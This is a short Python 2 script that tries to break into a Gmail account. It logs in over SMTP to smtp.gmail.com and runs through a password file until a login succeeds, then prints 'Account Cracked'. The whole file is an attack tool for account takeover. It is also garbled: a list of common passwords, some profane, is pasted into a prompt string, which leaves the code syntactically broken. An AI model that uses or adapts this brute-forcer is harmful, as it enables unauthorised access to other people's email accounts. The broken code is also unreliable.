import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("gamba@gmail.com: ")
passwfile = raw_input("123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
696969
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
pussy
superman
1qaz2wsx
7777777
fuckyou
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine: ")
passwfile = open(passwfile, "r")

for password in passwfile:
        try:
                smtpserver.login(user, password)

                print "[+] Account Cracked : %s" % password
                break; 
        except smtplib.SMTPAuthenticationError:
                print "[!] Password Incorrect :( : %s" % password﻿
